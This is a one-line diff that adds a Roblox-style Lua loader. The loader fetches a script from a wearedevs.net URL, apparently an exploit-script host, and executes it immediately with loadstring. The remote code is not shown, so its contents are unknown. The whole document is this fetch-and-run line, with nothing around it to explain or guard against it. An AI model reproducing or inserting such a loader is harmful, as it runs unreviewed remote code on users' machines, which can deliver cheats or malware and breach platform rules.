@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://obj.wearedevs.net/s/69a0cf6add16cd9363f67241.lua"))()
